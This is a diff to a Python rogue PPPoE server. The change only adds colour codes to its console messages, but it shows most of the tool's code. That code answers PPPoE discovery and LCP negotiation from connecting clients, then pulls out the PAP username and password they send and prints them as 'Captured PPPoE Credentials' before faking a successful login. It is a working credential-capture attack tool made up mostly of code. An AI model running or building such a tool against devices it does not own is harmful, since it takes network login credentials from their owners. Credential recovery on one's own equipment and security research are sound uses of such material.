@@ -79,20 +79,20 @@ class PPPoEServer:
                 mac = f.read().strip()
             return bytes.fromhex(mac.replace(":", ""))
         except FileNotFoundError:
-            print(f"[-] Error: Interface {self.interface} not found.")
+            print(f"\033[91m[-]\033[0m Error: Interface {self.interface} not found.")
 
     def start(self):
         """Start the PPPoE server."""
         try:
             self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
             self.sock.bind((self.interface, 0))
-            print(f"[+] PPPoE Server running on {self.interface} (MAC: {self.mac.hex(':')})")
-            print("[+] Waiting for PPPoE clients...")
+            print(f"\033[92m[+]\033[0m PPPoE Server running on {self.interface} (MAC: {self.mac.hex(':')})")
+            print("\033[92m[+]\033[0m Waiting for PPPoE clients...")
             self.listen()
         except PermissionError:
-            print("[-] Error: Must run as root (sudo required)")
+            print("\033[91m[-]\033[0m Error: Must run as root (sudo required)")
         except Exception as e:
-            print(f"[-] Error: {e}")
+            print(f"\033[91m[-]\033[0m Error: {e}")
 
     def listen(self):
         """Main packet processing loop."""
@@ -101,10 +101,10 @@ class PPPoEServer:
                 packet, _ = self.sock.recvfrom(65535)
                 self.process_packet(packet)
             except KeyboardInterrupt:
-                print("\n[!] Server stopped by user.")
+                print("\n\033[94m[!]\033[0m Server stopped by user.")
                 break
             except Exception as e:
-                print(f"[!] Error processing packet: {e}")
+                print(f"\033[91m[-]\033[0m Error processing packet: {e}")
 
     def process_packet(self, packet):
         """Process incoming PPPoE packets."""
@@ -166,7 +166,7 @@ class PPPoEServer:
     def handle_padi(self, src_mac, tags):
         """Respond to PADI (PPPoE Active Discovery Initiation)."""
         if args.verbose:
-            print(f"[+] Received PADI from {src_mac.hex(':')}")
+            print(f"\033[92m[+]\033[0m Received PADI from {src_mac.hex(':')}")
 
         # Check for Host-Uniq tag (used to match PADI-PADO-PADR)
         host_uniq = tags.get(0x0103, None)
@@ -195,12 +195,12 @@ class PPPoEServer:
         self.sock.send(eth_frame)
 
         if args.verbose:
-            print(f"[+] Sent PADO to {src_mac.hex(':')}")
+            print(f"\033[92m[+]\033[0m Sent PADO to {src_mac.hex(':')}")
 
     def handle_padr(self, src_mac, tags):
         """Handle PADR (Request)."""
         if args.verbose:
-            print(f"[+] Received PADR from {src_mac.hex(':')}")
+            print(f"\033[92m[+]\033[0m Received PADR from {src_mac.hex(':')}")
 
         # Generate session ID
         session_id = random.randint(1, 65535)
@@ -232,7 +232,7 @@ class PPPoEServer:
         )
         self.sock.send(eth_frame)
         if args.verbose:
-            print(f"[+] Sent PADS (Session ID: {session_id})")
+            print(f"\033[92m[+]\033[0m Sent PADS (Session ID: {session_id})")
 
 
     def send_lcp_conf_req(self, session_id, dst_mac):
@@ -268,12 +268,12 @@ class PPPoEServer:
 
         self.sock.send(eth_frame)
         if args.verbose:
-            print(f"[+] Sent LCP Configuration-Request (Session: {session_id})")
+            print(f"\033[92m[+]\033[0m Sent LCP Configuration-Request (Session: {session_id})")
 
     def handle_lcp(self, session_id, lcp_data, src_mac):
         """Handle LCP packets with full option parsing."""
         if len(lcp_data) < 4:
-            print("[!] Malformed LCP packet (too short)")
+            print("\033[91m[-]\033[0m Malformed LCP packet (too short)")
             return
 
         # Unpack LCP header (code, identifier, length)
@@ -282,7 +282,7 @@ class PPPoEServer:
 
         if code == LCP_CONF_REQ:
             if args.verbose:
-                print(f"[+] Received LCP Configuration-Request (ID: {identifier}, Session: {session_id})")
+                print(f"\033[92m[+]\033[0m Received LCP Configuration-Request (ID: {identifier}, Session: {session_id})")
 
             # Parse all LCP options
             pos = 0
@@ -290,7 +290,7 @@ class PPPoEServer:
                 try:
                     opt_type, opt_len = struct.unpack("!BB", options[pos:pos+2])
                     if opt_len < 2 or (pos + opt_len) > len(options):
-                        print(f"[!] Invalid option length {opt_len} at position {pos}")
+                        print(f"\033[91m[-]\033[0m Invalid option length {opt_len} at position {pos}")
                         break
                     
                     opt_data = options[pos+2:pos+opt_len]
@@ -317,7 +317,7 @@ class PPPoEServer:
                     pos += opt_len
                     
                 except struct.error as e:
-                    print(f"[!] Failed to unpack option at position {pos}: {e}")
+                    print(f"\033[91m[-]\033[0m Failed to unpack option at position {pos}: {e}")
                     break
 
             # Send Configuration-Ack with original options
@@ -327,29 +327,29 @@ class PPPoEServer:
 
         elif code == LCP_CONF_ACK:
             if args.verbose:
-                print(f"[+] Received LCP Configuration-Ack (ID: {identifier}, Session: {session_id})")
+                print(f"\033[92m[+]\033[0m Received LCP Configuration-Ack (ID: {identifier}, Session: {session_id})")
 
         elif code == LCP_CONF_NAK:
             if args.verbose:
-                print(f"[+] Received LCP Configuration-Nak (ID: {identifier}, Session: {session_id})")
+                print(f"\033[92m[+]\033[0m Received LCP Configuration-Nak (ID: {identifier}, Session: {session_id})")
             # Handle NAK (typically resend config with adjusted parameters)
         elif code == LCP_ECHO_REQ:
             if args.verbose:
-                print(f"[+] Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
+                print(f"\033[92m[+]\033[0m Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
             # Respond with Echo-Reply
             self.send_lcp_echo_reply(session_id, identifier, src_mac)
 
         # elif code == LCP_CONF_REJ:
-        #     print(f"[+] Received LCP Configuration-Reject (ID: {identifier}, Session: {session_id})")
+        #     print(f"\033[92m[+]\033[0m Received LCP Configuration-Reject (ID: {identifier}, Session: {session_id})")
         #     # Handle rejected options
 
         # elif code == LCP_ECHO_REQ:
-        #     print(f"[+] Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
+        #     print(f"\033[92m[+]\033[0m Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
         #     self.send_lcp_echo_reply(session_id, identifier, options, src_mac)
 
         else:
             if args.verbose:
-                print(f"[!] Unknown LCP code {code} (Session: {session_id})")
+                print(f"\033[91m[-]\033[0m Unknown LCP code {code} (Session: {session_id})")
 
     def send_lcp_conf_ack(self, session_id, identifier, options, dst_mac):
         """Send LCP Configuration-Acknowledgment packet.
@@ -392,7 +392,7 @@ class PPPoEServer:
         
         # Debug output
         if args.verbose and session_id in self.sessions:
-            print(f"[+] Sent LCP Config-Ack (ID: {identifier}, Session: {session_id})")
+            print(f"\033[92m[+]\033[0m Sent LCP Config-Ack (ID: {identifier}, Session: {session_id})")
 
     def send_lcp_echo_reply(self, session_id, identifier, dst_mac):
         """Send LCP Echo-Reply packet.
@@ -427,7 +427,7 @@ class PPPoEServer:
         # Send packet
         self.sock.send(eth_frame)
         if args.verbose:
-            print("[+] Sent LCP Echo-Reply")
+            print("\033[92m[+]\033[0m Sent LCP Echo-Reply")
 
     def handle_pap(self, session_id, pap_data, src_mac):
         """Handle PAP authentication."""
@@ -439,9 +439,9 @@ class PPPoEServer:
                 passwd_len = pap_data[5+peer_id_len]
                 password = pap_data[6+peer_id_len:6+peer_id_len+passwd_len].decode("ascii", errors="ignore")
 
-                print("\n[!] Captured PPPoE Credentials:")
-                print(f"    Username:   {peer_id}")
-                print(f"    Password:   {password}\n")
+                print("\n\033[94m[!] \033[1mCaptured PPPoE Credentials:\033[0m")
+                print(f"    \033[1;33mUsername:   \033[0;32m{peer_id}\033[0m")
+                print(f"    \033[1;33mPassword:   \033[0;32m{password}\033[0m\n")
 
                 # Send ACK
                 msg = b"Authentication successful"
@@ -457,11 +457,11 @@ class PPPoEServer:
                 
                 self.sock.send(eth_frame)
                 if args.verbose:
-                    print("[+] Sent PAP ACK")
+                    print("\033[92m[+]\033[0m Sent PAP ACK")
                 sys.exit(0)
 
         except Exception as e:
-            print(f"[!] Error parsing PAP: {e}")
+            print(f"\033[91m[-]\033[0m Error parsing PAP: {e}")
 
 if __name__ == "__main__":
     args = parse_args()
